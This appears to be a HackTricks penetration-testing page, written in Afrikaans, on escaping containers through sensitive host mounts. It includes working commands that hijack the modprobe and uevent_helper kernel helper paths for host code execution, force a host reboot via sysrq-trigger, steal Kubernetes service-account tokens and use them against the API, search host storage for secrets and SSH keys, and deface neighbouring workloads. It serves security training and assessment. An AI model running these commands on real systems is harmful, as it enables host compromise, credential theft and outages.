# Gevoelige gasheer-aanhegtings

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Gasheer-aanhegtings is een van die belangrikste praktiese container-escape-oppervlakke omdat hulle dikwels 'n noukeurig geïsoleerde proses-uitsig terug laat inklap na direkte sigbaarheid van gasheerhulpbronne. Die gevaarlike gevalle beperk hom nie tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, of device-verwante paaie kan kernel-beheerkoppelvlakke, credentials, aangrensende container-fs, en runtime-bestuurskoppelvlakke blootstel.

Hierdie bladsy bestaan afsonderlik van die individuele beskermingsbladsye omdat die misbruikmodel kruis-snydend is. 'n Skryfbare gasheer-mount is gevaarlik deels as gevolg van mount namespaces, deels as gevolg van user namespaces, deels as gevolg van AppArmor of SELinux-dekking, en deels as gevolg van watter presiese gasheerpad geopenbaar is. Om dit as 'n eie onderwerp te behandel maak die aanvalsopevlak baie makliker om oor te redeneer.

## `/proc` Blootstelling

procfs bevat beide gewone prosesinligting en hoog-impak kernel-beheerkoppelvlakke. 'n Bind mount soos `-v /proc:/host/proc` of 'n kontainerview wat onverwagte skryfbare proc-inskrywings openbaar kan dus lei tot inligtingsblootstelling, denial of service, of direkte gasheerkode-uitvoering.

Hoë-waarde procfs-paaie sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur te kontroleer watter hoë-waarde procfs-inskrywings sigbaar of skryfbaar is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paaie is om verskeie redes interessant. `core_pattern`, `modprobe`, en `binfmt_misc` kan host code-execution paaie word wanneer skryfbaar. `kallsyms`, `kmsg`, `kcore`, en `config.gz` is kragtige reconnaissance-bronne vir kernel-exploitation. `sched_debug` en `mountinfo` openbaar proses-, cgroup- en filesystem-konteks wat kan help om die host-opset van binne die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om almal asof hulle dieselfde impak het te behandel maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
  As dit skryfbaar is, is dit een van die hoogs-impak procfs-paaie omdat die kernel 'n pipe handler sal uitvoer na 'n crash. 'n Container wat `core_pattern` na 'n payload in sy overlay of in 'n gemounte host-pad kan wys, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir 'n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
  Hierdie pad beheer die userspace helper wat die kernel gebruik wanneer dit module-loading logika moet aanroep. As dit vanaf die container skryfbaar is en in die host-konteks geïnterpreteer word, kan dit 'n ander host code-execution primitief word. Dit is veral interessant as dit gekombineer word met 'n manier om die helper-pad te trigger.
- `/proc/sys/vm/panic_on_oom`
  Dit is gewoonlik nie 'n netjiese escape primitive nie, maar dit kan geheue-druk in 'n host-wye denial of service omskep deur OOM-toestande in kernel panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
  As die registration interface skryfbaar is, kan die aanvaller 'n handler registreer vir 'n gekose magic value en host-konteks uitvoering verkry wanneer 'n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
  Nuttig vir kernel exploit triage. Dit help bepaal watter subsisteme, mitigasies en opsionele kernel-funksies geaktiveer is sonder om op host-pakket-metadata staat te maak.
- `/proc/sysrq-trigger`
  Meestal 'n denial-of-service-pad, maar 'n baie ernstige een. Dit kan die host onmiddellik reboot, panic, of andersins ontwrig.
- `/proc/kmsg`
  Reveals kernel ring buffer messages. Nuttig vir host fingerprinting, crash-analise, en in sommige omgewings vir leaking van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
  Waardevol wanneer leesbaar omdat dit geëksporteerde kernel-symbolinligting blootstel en kan help om address-randomization-aanname tydens kernel-exploit-ontwikkeling te neutraliseer.
- `/proc/[pid]/mem`
  Dit is 'n direkte proses-geheue-koppelvlak. As die teikenproses bereikbaar is met die nodige ptrace-style voorwaarden, kan dit lees of wysiging van 'n ander proses se geheue toelaat. Die realistiese impak hang swaar af van credentials, `hidepid`, Yama, en ptrace-restriksies, so dit is 'n kragtige maar voorwaardelike pad.
- `/proc/kcore`
  Blootstel 'n core-image-styl siening van stelselgeheue. Die lêer is enorm en onhandig om te gebruik, maar as dit betekenisvol leesbaar is dui dit op 'n swak blootgestelde host-geheue-oppervlak.
- `/proc/kmem` and `/proc/mem`
  Histories hoë-impak raw memory interfaces. Op baie moderne stelsels is hulle gedeaktiveer of swaar beperk, maar as teenwoordig en bruikbaar moet hulle as kritiese bevindings behandel word.
- `/proc/sched_debug`
  Leaks scheduling en taakinligting wat host-proses-identiteite kan blootstel selfs wanneer ander proses-uitsigte skoner lyk as verwag.
- `/proc/[pid]/mountinfo`
  Uiterst nuttig om te rekonstrueer waar die container werklik op die host woon, watter paaie overlay-backed is, en of 'n skryfbare mount ooreenstem met host-inhoud of net met die container-laag.

As `/proc/[pid]/mountinfo` of overlay-details leesbaar is, gebruik dit om die host-pad van die container filesystem te herstel:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat 'n aantal host-execution tricks vereis dat 'n pad binne die container omskakel word na die ooreenstemmende pad vanuit die host se oogpunt.

### Volle Voorbeeld: `modprobe` Helper Path Abuse

As `/proc/sys/kernel/modprobe` vanuit die container skryfbaar is en die helper path in die host context geïnterpreteer word, kan dit herlei word na 'n attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Die presiese trigger hang af van die teiken en die kernel-gedrag, maar die belangrike punt is dat 'n skryfbare helper-pad 'n toekomstige kernel-helper-aanroep kan herlei na inhoud op 'n aanvaller-beheerde host-pad.

### Volledige Voorbeeld: Kernel Recon Met `kallsyms`, `kmsg`, En `config.gz`

As die doel exploitability assessment eerder as onmiddellike escape is:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help beantwoord of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand openbaar, en watter kernel-funksies of mitigasies gecompileer is. Die impak is gewoonlik nie 'n direkte escape nie, maar dit kan kernel-kwesbaarheid triage aansienlik verkort.

### Volledige voorbeeld: SysRq Host Reboot

As `/proc/sysrq-trigger` skryfbaar is en die gasheer-sig bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is 'n onmiddellike herbegin van die host. Dit is nie 'n subtiele voorbeeld nie, maar dit illustreer duidelik dat procfs-blootstelling veel ernstiger kan wees as die onthulling van inligting.

## `/sys` Blootstelling

sysfs openbaar groot hoeveelhede kernel- en toesteltoestand. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper-uitvoering, toestelgedrag, security-module-konfigurasie of firmwaretoestand kan beïnvloed.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is van belang om verskeie redes. `/sys/class/thermal` kan termiese-bestuursgedrag beïnvloed en dus host-stabiliteit in sleg blootgestelde omgewings beïnvloed. `/sys/kernel/vmcoreinfo` kan leak crash-dump- en kernel-layout-inligting wat help met laagvlak host fingerprinting. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, so onverwagte toegang daar kan MAC-verwante toestand blootstel of verander. EFI-variabelepaaie kan firmware-ondersteunde opstartinstellings beïnvloed, wat dit baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is veral gevaarlik omdat dit doelbewus 'n ontwikkelaar-gefokusde koppelvlak is met baie minder veiligheidsverwachtings as geharde, produksiegerigte kernel-API's.

Nuttige opdragte om hierdie paaie te kontroleer is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Waarom daardie opdragte interessant is:

- `/sys/kernel/security` kan aandui of AppArmor, SELinux of 'n ander LSM-oppervlak sigbaar is op 'n wyse wat eksklusief tot die gasheer moes bly.
- `/sys/kernel/debug` is dikwels die mees kommerwekkende bevinding in hierdie groep. As `debugfs` gemonteer is en leesbaar of skryfbaar is, verwag 'n wye kerngerigte oppervlak waarvan die presiese risiko afhang van die ingeskakelde debug-knope.
- Blootstelling van EFI-variabeles is minder algemeen, maar as dit teenwoordig is het dit groot impak omdat dit firmware-ondersteunde instellings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir gasheerstabiliteit en hardeware-interaksie, nie vir elegante shell-agtige ontsnapping nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik 'n bron vir gasheer-fingerafdruk en foutontleding, nuttig om lae-vlak kerntoestand te verstaan.

### Full Example: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kern 'n helper wat deur 'n aanvaller beheer word, uitvoer wanneer 'n `uevent` geaktiveer word:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Die rede waarom dit werk is dat die helper-pad vanuit die gasheer se perspektief geïnterpreteer word. Sodra dit geaktiveer word, loop die helper in die gasheer-konteks eerder as binne die huidige container.

## `/var` Blootstelling

Die mount van die gasheer se `/var` in 'n container word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens en naburige application filesystems te bereik. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container state eintlik geleë is.

### Kubernetes Voorbeeld

'n pod met `hostPath: /var` kan dikwels ander pods se projected tokens en overlay snapshot content lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle antwoord of die mount slegs vervelige toepassingsdata blootstel of hoë‑impak kluster‑credentials. 'n Leesbare service-account token kan onmiddellik local code execution in Kubernetes API access omskakel.

Indien die token teenwoordig is, valideer wat dit kan bereik in plaas van by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan veel groter wees as plaaslike node-toegang. 'n Token met wye RBAC kan 'n gemonteerde `/var` in 'n clusterwye kompromittering omskep.

### Docker en containerd Voorbeeld

Op Docker-gashere is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-gedrewe Kubernetes-nodes moontlik onder `/var/lib/containerd` of snapshotter-spesifieke paaie kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemonteerde `/var` skryfbare snapshot-inhoud van 'n ander workload blootstel, kan die aanvaller toepassingslêers verander, webinhoud plant, of opstartskripte wysig sonder om die huidige containerkonfigurasie aan te raak.

Konkrete misbruikidees sodra skryfbare snapshot-inhoud gevind is:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Hierdie opdragte is nuttig omdat hulle die drie hoof-impakfamilies van gemonteerde `/var` toon: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Runtime-sokette

Sensitiewe gasheer-monteerings sluit dikwels runtime-sokette eerder as volledige gidse in. Dit is so belangrik dat dit hier eksplisiet herhaal moet word:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets gemount is.

As 'n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
As een hiervan slaag, is die pad van "mounted socket" na "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout-pad.

## Mount-verwante CVEs

Host mounts sny ook oor met runtime kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar 'n leaked directory file descriptor die working directory op die host filesystem kon plaas.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, waar OverlayFS copy-up races host-path writes tydens builds kon produseer.
- `CVE-2024-1753` in Buildah and Podman build flows, waar crafted bind mounts tydens build `/` read-write kon blootstel.
- `CVE-2024-40635` in containerd, waar 'n groot `User` waarde in UID 0-gedrag kon oorloop.

Hierdie CVEs is hier belangrik omdat hulle wys dat mount handling nie net oor operator-konfigurasie gaan nie. Die runtime self kan ook mount-gedrewe escape-toestande veroorsaak.

## Kontroles

Gebruik hierdie opdragte om die hoogste-waarde mount blootstellings vinnig te vind:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var`, en runtime sockets is almal bevindinge met hoë prioriteit.
- Skryfbare proc/sys-inskrywings dui dikwels daarop dat die mount host-global kernel controls blootstel eerder as 'n veilige container-uitsig.
- Gemonteerde `/var`-paaie verdien 'n beoordeling van credentials en naburige workloads, nie net 'n lêerstelselbeoordeling nie.
{{#include ../../../banners/hacktricks-training.md}}
